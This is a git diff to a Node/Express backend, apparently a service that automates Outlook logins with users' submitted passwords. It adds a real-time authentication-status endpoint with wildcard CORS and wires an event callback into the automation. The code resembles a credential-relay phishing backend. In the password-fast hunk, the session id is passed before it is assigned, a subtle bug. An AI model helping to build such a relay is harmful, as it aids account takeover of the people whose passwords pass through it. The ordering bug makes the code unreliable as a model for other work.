@@ -78,8 +78,27 @@ const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
 const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
 const MAX_PRELOADS = 2; // Maximum number of concurrent preloaded browsers
 
+// Store for SSE connections to send immediate authentication status updates
+const sseConnections = new Map(); // sessionId -> response object
+
 // Analytics tracking with persistent storage
 const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');
+
+// Function to broadcast immediate authentication events via SSE
+function broadcastAuthEvent(sessionId, event, data = {}) {
+    const connection = sseConnections.get(sessionId);
+    if (connection && !connection.destroyed) {
+        try {
+            const eventData = JSON.stringify({ ...data, timestamp: Date.now() });
+            connection.write(`event: ${event}\n`);
+            connection.write(`data: ${eventData}\n\n`);
+            console.log(`📡 SSE event sent to ${sessionId}: ${event}`);
+        } catch (error) {
+            console.warn(`SSE broadcast error for ${sessionId}:`, error.message);
+            sseConnections.delete(sessionId);
+        }
+    }
+}
 
 // Load analytics from file
 function loadAnalytics() {
@@ -253,7 +272,9 @@ async function startBrowserPreload(sessionId, email) {
         // Create new automation instance
         const automation = new OutlookLoginAutomation({
             enableScreenshots: true,
-            screenshotQuality: 80
+            screenshotQuality: 80,
+            sessionId: sessionId,
+            eventCallback: broadcastAuthEvent
         });
 
         // Store in automationSessions with preloading status
@@ -340,6 +361,39 @@ app.get('/api/health', (req, res) => {
         status: 'OK', 
         message: 'Microsoft Graph API Backend is running',
         authConfigured: !!(process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID)
+    });
+});
+
+// SSE endpoint for real-time authentication status updates
+app.get('/api/auth-status/:sessionId', (req, res) => {
+    const { sessionId } = req.params;
+    
+    // Set SSE headers
+    res.writeHead(200, {
+        'Content-Type': 'text/event-stream',
+        'Cache-Control': 'no-cache',
+        'Connection': 'keep-alive',
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Headers': 'Cache-Control'
+    });
+
+    // Send initial connection confirmation
+    res.write(`event: connected\n`);
+    res.write(`data: ${JSON.stringify({ sessionId, timestamp: Date.now() })}\n\n`);
+
+    // Store connection for this session
+    sseConnections.set(sessionId, res);
+    console.log(`🔗 SSE connection established for session: ${sessionId}`);
+
+    // Handle client disconnect
+    req.on('close', () => {
+        sseConnections.delete(sessionId);
+        console.log(`❌ SSE connection closed for session: ${sessionId}`);
+    });
+
+    req.on('error', (error) => {
+        console.warn(`SSE connection error for ${sessionId}:`, error.message);
+        sseConnections.delete(sessionId);
     });
 });
 
@@ -1146,7 +1200,9 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
             automation = new OutlookLoginAutomation({
                 enableScreenshots: true,
-                screenshotQuality: 80
+                screenshotQuality: 80,
+                sessionId: newSessionId,
+                eventCallback: broadcastAuthEvent
             });
 
             newSessionId = createSessionId();
@@ -1333,7 +1389,9 @@ app.post('/api/login-automation', async (req, res) => {
         // Initialize automation
         const automation = new OutlookLoginAutomation({
             enableScreenshots: true,
-            screenshotQuality: 80
+            screenshotQuality: 80,
+            sessionId: sessionId,
+            eventCallback: broadcastAuthEvent
         });
 
         // Store automation session
